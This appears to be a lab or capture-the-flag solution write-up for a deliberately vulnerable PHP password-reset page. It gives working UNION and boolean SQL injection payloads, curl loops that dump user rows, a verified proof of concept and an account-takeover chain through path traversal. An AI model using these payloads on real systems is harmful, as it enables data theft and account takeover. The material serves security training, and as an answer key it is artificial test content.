# 04 — UNION SQL injection in password reset, step 1

- **OWASP Top 10 (2021):** A03:2021 – Injection
- **Severity:** High
- **Difficulty:** Medium

## Where

`web/reset.php:16` — `POST /reset.php` with `step=1`, field `who`
(unauthenticated):

```php
$in = isset($_POST['who']) ? $_POST['who'] : '';
...
$q = 'SELECT * FROM users WHERE username = \'' . $in . '\' OR email = \'' . $in . '\'';
$r = mysqli_query($db, $q);
$row = mysqli_fetch_assoc($r);
```

## How it works (root cause)

The input is substituted into **two** quoted literals. Breaking out of the
first one lets you terminate the first half and append a UNION SELECT whose
row is returned by `mysqli_fetch_assoc()` (the first row of the result set).
The response leaks that row's **email address** in:

```php
$msg = 'En ny kod har skickats till ' . $row['email'] . '. Koden är giltig i 15 minuter.';
```

and it also **creates a real reset code** for the returned username
(`web/reset.php:26-29`).

## Exploitation steps

1. Dump one user row at a time (first row of `users` by default):

   ```bash
   curl -s -d "step=1&who=x' UNION SELECT id,username,password_md5,email,display_name,role FROM users -- " \
        http://localhost:8080/reset.php | grep -o 'En ny kod har skickats till [^<]*'
   ```

2. Iterate to read every row:

   ```bash
   for id in 1 2 3 4; do
     curl -s -d "step=1&who=x' UNION SELECT id,username,password_md5,email,display_name,role FROM users WHERE id=$id -- " \
          http://localhost:8080/reset.php | grep -o 'skickats till [^<]*'
   done
   ```

   (Only `email` is echoed — but `WHERE id=$id` selects which row it is.
   Combine with a boolean probe if you need other columns.)

3. Easier variant that leaks an email without UNION:

   ```bash
   curl -s -d "step=1&who=admin' OR '1'='1" http://localhost:8080/reset.php | grep -o 'skickats till [^<]*'
   ```

## Working PoC (verified)

```
who = x' UNION SELECT id,username,password_md5,email,display_name,role FROM users --
```

```
En ny kod har skickats till ulla.lindqvist@osedekommun.se. Koden är giltig i 15 minuter.
```

## Expected result / verification

- Response names the target user's email (account enumeration + email leak).
- A new row appears in `reset_codes` for the returned username, and the code
  is written in cleartext to `data/logs/app.log` (`web/reset.php:29`).

## Attack chain

```
UNION reset step 1
  → (a) enumerate users + emails
  → (b) trigger a reset code for ANY user
        → read the code from data/logs/app.log via path traversal (10):
           /image.php?file=../data/logs/app.log
        → step 2+3 with code → set new password → take over the account
  (c) the same query shape in step 2 (web/reset.php:41) is error-based
      injectable → see 05
```

This is the intended "take over ulla" chain without brute force.
